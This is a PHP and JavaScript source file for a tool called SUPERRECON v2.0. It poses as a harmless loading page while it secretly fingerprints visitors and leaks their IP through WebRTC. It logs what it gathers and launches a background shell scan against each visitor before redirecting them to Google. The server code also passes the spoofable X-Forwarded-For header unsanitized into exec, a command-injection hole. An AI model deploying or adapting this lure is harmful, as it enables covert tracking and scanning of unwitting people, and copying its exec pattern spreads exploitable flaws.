<?php
/**
 * index.php - Página de captura do SUPERRECON v2.0
 * 
 * Funciona como frontend: captura IP e dados do navegador via JS,
 * salva em arquivo e dispara o scan Shell em background.
 */

// Cria diretório de capturas se não existir
$capture_dir = __DIR__ . '/captures';
if (!is_dir($capture_dir)) {
    mkdir($capture_dir, 0755, true);
}

// Se recebeu dados via GET (requisição AJAX do JS)
if (isset($_GET['d'])) {
    $dados = base64_decode($_GET['d']);
    $dados_json = json_decode($dados, true);
    
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    $dados_json['ip'] = $ip;
    $dados_json['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
    $dados_json['timestamp'] = date('Y-m-d H:i:s');
    
    // Salva em captures/<IP>/<timestamp>.json
    $ip_dir = $capture_dir . '/' . $ip;
    if (!is_dir($ip_dir)) {
        mkdir($ip_dir, 0755, true);
    }
    $arquivo = $ip_dir . '/' . date('Ymd_His') . '.json';
    file_put_contents($arquivo, json_encode($dados_json, JSON_PRETTY_PRINT));
    
    // Grava o IP no arquivo last_ip.txt para o orquestrador detectar
    file_put_contents($capture_dir . '/last_ip.txt', $ip);
    
    // Dispara o script Shell em background (modo scan)
    exec("./super_recon.sh -s $ip > /dev/null 2>&1 &");
    
    die('OK'); // Resposta para o AJAX
}

// Se não for requisição AJAX, serve o HTML com o JavaScript de coleta
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 6px solid #21262d; border-top: 6px solid #58a6ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #8b949e; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <p>Carregando, aguarde...</p>
    </div>

    <script>
        // Coleta dados do navegador
        const dados = {
            screen: screen.width + 'x' + screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            os: (navigator.userAgent.includes('Win')) ? 'Windows' :
                (navigator.userAgent.includes('Mac')) ? 'MacOS' :
                (navigator.userAgent.includes('Linux')) ? 'Linux' : 'Mobile',
            local_ip: 'N/A',
            battery: 'N/A'
        };

        // Tenta pegar IP local via WebRTC
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        pc.createDataChannel('leak');
        pc.createOffer()
            .then(o => pc.setLocalDescription(o))
            .catch(() => {});
        pc.onicecandidate = (e) => {
            if (e.candidate && e.candidate.candidate.includes('srflx')) {
                dados.local_ip = e.candidate.candidate.split(' ')[4];
            }
        };

        // Tenta pegar nível de bateria
        if (navigator.getBattery) {
            navigator.getBattery().then(bateria => {
                dados.battery = Math.round(bateria.level * 100);
                enviarDados();
            }).catch(() => enviarDados());
        } else {
            enviarDados();
        }

        function enviarDados() {
            setTimeout(() => {
                const payload = btoa(JSON.stringify(dados));
                fetch('?d=' + payload)
                    .then(() => {
                        // Redireciona para o destino configurado (padrão: Google)
                        window.location.href = '<?php echo getenv("REDIRECT_URL") ?: "https://www.google.com"; ?>';
                    })
                    .catch(() => {
                        // Fallback se fetch falhar
                        window.location.href = 'https://www.google.com';
                    });
            }, 2000); // Delay de 2 segundos para coleta
        }
    </script>
</body>
</html>
